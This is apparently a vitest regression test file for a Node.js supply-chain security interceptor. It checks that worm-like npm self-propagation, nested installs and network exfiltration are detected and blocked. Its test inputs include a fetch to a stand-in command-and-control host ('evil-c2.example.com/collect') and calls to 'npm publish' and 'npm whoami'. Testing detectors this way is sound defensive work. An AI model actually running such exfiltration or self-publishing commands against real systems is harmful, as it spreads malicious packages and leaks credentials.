/**
 * Regression tests — interceptor coverage gaps.
 *
 * Bugs covered:
 *  - spawn('npm', ['publish']) evaded self_propagation detection because only
 *    args[0] (the binary name) was regex-tested. Now args[1] is joined in.
 *  - execFile wasn't wrapped at all.
 *  - fetch / globalThis.fetch bypassed http.request interception entirely.
 *  - install_script signal was defined but never emitted — nested installs
 *    (a worm staging its own deps) now fire it.
 */

import { describe, it, expect, afterEach } from 'vitest';
import { createRequire } from 'node:module';
import { Engine, ChainWatchBlockError } from '../../src/engine.js';
import { DEFAULT_POLICY, type Policy } from '../../src/policy.js';
// Side-effect import — registers the interceptor installers with Engine.
import '../../src/intercept/index.js';

const require = createRequire(import.meta.url);
// NOTE: we require() builtins rather than `await import('node:...')` because
// ESM builtin namespaces are snapshots — vitest materialized them before the
// patches were installed. require() returns the live (patched) exports, which
// is what real CJS packages get.

/** A policy where every evaluated event blocks — wrappers throw before the real call. */
const BLOCK_ALL: Policy = {
  ...DEFAULT_POLICY,
  blockThreshold: 0,
  chainBlockThreshold: 0,
};

function blockEvent(engine: Engine, fn: () => unknown): string | null {
  try {
    fn();
    return null; // call went through unblocked
  } catch (e) {
    if (e instanceof ChainWatchBlockError) return e.event.signal;
    throw e;
  }
}

describe('interceptor regression', () => {
  const engines: Engine[] = [];
  afterEach(() => {
    for (const e of engines.splice(0)) e.uninstall();
  });

  function freshEngine(policy: Policy = BLOCK_ALL): Engine {
    const e = new Engine(policy);
    e.install();
    engines.push(e);
    return e;
  }

  it("spawn('npm', ['publish']) fires self_propagation and blocks", () => {
    const engine = freshEngine();
    const { spawn } = require('node:child_process');
    const signal = blockEvent(engine, () => spawn('npm', ['publish']));
    expect(signal).toBe('self_propagation');
  });

  it("spawn('npm', ['install']) fires install_script", () => {
    const engine = freshEngine();
    const { spawn } = require('node:child_process');
    const signal = blockEvent(engine, () => spawn('npm', ['install', 'left-pad']));
    expect(signal).toBe('install_script');
  });

  it("execFile('npm', ['publish']) is intercepted (previously unwrapped)", () => {
    const engine = freshEngine();
    const { execFile } = require('node:child_process');
    const signal = blockEvent(engine, () => execFile('npm', ['publish']));
    expect(signal).toBe('self_propagation');
  });

  it("execFile('npm', ['whoami']) fires self_propagation (token enumeration)", () => {
    const engine = freshEngine();
    const { execFile } = require('node:child_process');
    const signal = blockEvent(engine, () => execFile('npm', ['whoami']));
    expect(signal).toBe('self_propagation');
  });

  it('global fetch to a non-allowlisted host fires network_exfil', async () => {
    const engine = freshEngine();
    const signal = blockEvent(engine, () => fetch('http://evil-c2.example.com/collect'));
    expect(signal).toBe('network_exfil');
  });

  it('fetch to an allowlisted host does not block', async () => {
    // log-only policy — fetch should proceed (and fail on its own with a
    // network error, NOT a ChainWatchBlockError).
    const engine = freshEngine({ ...DEFAULT_POLICY, blockThreshold: 100, chainBlockThreshold: 100 });
    await expect(fetch('https://registry.npmjs.org/', { signal: AbortSignal.timeout(3000) })
      .then(() => 'ok')
      .catch((e) => (e instanceof ChainWatchBlockError ? 'blocked' : 'neterr')))
      .resolves.not.toBe('blocked');
    engine.uninstall();
  });
});
